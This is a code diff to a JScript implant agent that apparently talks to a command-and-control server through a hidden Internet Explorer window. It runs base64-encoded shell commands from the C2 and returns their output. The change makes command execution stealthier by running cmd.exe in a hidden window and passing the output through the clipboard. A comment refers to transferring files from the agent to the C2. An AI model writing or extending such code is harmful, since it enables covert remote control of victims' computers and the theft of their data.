@@ -1,6 +1,7 @@
 //------------------------------------------------------------------------------------------------
 var ie = new ActiveXObject("InternetExplorer.Application");
 var sh = new ActiveXObject("WScript.Shell");
+var hf = new ActiveXObject("htmlfile");
 ie.visible = false;
 var done = false;
 var prefix = "${prefix}";
@@ -37,9 +38,15 @@ try {
 				case "cli":
 					var cli = decodeBase64(inputParameters[1]);
 					
-					// Execute the cli, then store the resulting output into the corresponding div
-					var oExec = sh.Exec("cmd.exe /c " + cli + " 2>&1");
-					output.innerText = encodeBase64(oExec.StdOut.ReadAll());
+					// Execute the cli in a hidden window
+					sh.Run("cmd.exe /c " + cli + " 2>&1 | clip.exe", 0, true);
+
+					//-----------------------------------------------------------------------------
+					// Retrieve result from the clipboard
+					var result = hf.parentWindow.clipboardData.getData('text');
+					
+					// Store the resulting output into the corresponding div
+					output.innerText = encodeBase64(result);
 					break;
 				
 				//--- Transfer file from agent to C2
